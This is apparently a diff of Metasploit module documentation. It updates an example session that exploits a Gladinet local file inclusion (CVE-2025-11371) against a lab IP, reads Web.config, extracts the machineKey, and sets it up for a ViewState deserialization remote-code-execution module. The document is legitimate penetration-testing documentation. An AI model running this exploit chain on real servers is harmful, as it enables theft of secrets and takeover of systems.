@@ -59,12 +59,18 @@ msf6 auxiliary(gather/gladinet_storage_lfi_cve_2025_11371) > set rhosts 192.168.
 rhosts => 192.168.1.21
 msf6 auxiliary(gather/gladinet_storage_lfi_cve_2025_11371) > set rport 80
 rport => 80
+msf6 auxiliary(gather/gladinet_storage_lfi_cve_2025_11371) > set ssl false
+ssl => false
+msf6 auxiliary(gather/gladinet_storage_lfi_cve_2025_11371) > set filepath "C:\Program Files (x86)\Gladinet Cloud Enterprise\root\Web.config"
+filepath => C:\Program Files (x86)\Gladinet Cloud Enterprise\root\Web.config
+msf6 auxiliary(gather/gladinet_storage_lfi_cve_2025_11371) > set extract_machinekey true
+extract_machinekey => true
 msf6 auxiliary(gather/gladinet_storage_lfi_cve_2025_11371) > run
 [*] Running module against 192.168.1.21
 [*] Running automatic check ("set AutoCheck false" to disable)
-[+] The target is vulnerable. LFI vulnerability confirmed
-[*] Attempting to read file via LFI: Program Files (x86)\Gladinet Cloud Enterprise\root\Web.config
-[+] Successfully read file: Program Files (x86)\Gladinet Cloud Enterprise\root\Web.config
+[+] The target is vulnerable. LFI vulnerability confirmed (Build 16.1.10296.56315)
+[*] Attempting to read file via LFI: C:\Program Files (x86)\Gladinet Cloud Enterprise\root\Web.config
+[+] Successfully read file: C:\Program Files (x86)\Gladinet Cloud Enterprise\root\Web.config
 
 <?xml version="1.0" encoding="UTF-8"?>
 <!--
@@ -116,6 +122,9 @@ msf6 auxiliary(gather/gladinet_storage_lfi_cve_2025_11371) > run
 	<add key="Sysnumber" value="4855426994914051" />
 	<add key="EmailPwd" value="" />
     <add key="InstalledApp" value="true" />
+	<add key="UseDerivedSysNumber" value="true" />
+	<add key="CSBizEdition" value="true" />
+	<add key="CanTrace" value="false" />
 
   </appSettings>
 
@@ -139,15 +148,15 @@ msf6 auxiliary(gather/gladinet_storage_lfi_cve_2025_11371) > run
   
 </configuration>
 
-[+] File saved to: /home/chocapikk/.msf4/loot/20251212163357_default_192.168.1.21_gladinet.file_288162.txt
+[+] File saved to: /home/chocapikk/.msf4/loot/20251212190237_default_192.168.1.21_gladinet.file_441872.txt
 [+] Extracted machineKey from Web.config
-MachineKey: B4C3E4CB6CAF27CA9F7909640A4D608CC4458173F13E09C95496832242CC3228E292EEFFCDA089149D789E0C4D7C1A5D02BC542F7C6279BE9DD770C9EDD5D67C66B7E621411D3E57EA181BBF89FD21957DCDDFACFD926E16
+MachineKey: 5496832242CC3228E292EEFFCDA089149D789E0C4D7C1A5D02BC542F7C6279BE9DD770C9EDD5D67C66B7E621411D3E57EA181BBF89FD21957DCDDFACFD926E16
 
 [+] For RCE: use exploit/windows/http/gladinet_viewstate_deserialization_cve_2025_30406
 [*] Set the MACHINEKEY option in the exploit module:
 use exploit/windows/http/gladinet_viewstate_deserialization_cve_2025_30406
-set MACHINEKEY B4C3E4CB6CAF27CA9F7909640A4D608CC4458173F13E09C95496832242CC3228E292EEFFCDA089149D789E0C4D7C1A5D02BC542F7C6279BE9DD770C9EDD5D67C66B7E621411D3E57EA181BBF89FD21957DCDDFACFD926E16
-[+] MachineKey saved to: /home/chocapikk/.msf4/loot/20251212163357_default_192.168.1.21_gladinet.machine_794910.txt
+set MACHINEKEY 5496832242CC3228E292EEFFCDA089149D789E0C4D7C1A5D02BC542F7C6279BE9DD770C9EDD5D67C66B7E621411D3E57EA181BBF89FD21957DCDDFACFD926E16
+[+] MachineKey saved to: /home/chocapikk/.msf4/loot/20251212190237_default_192.168.1.21_gladinet.machine_180409.txt
 [*] Auxiliary module execution completed
 ```
 
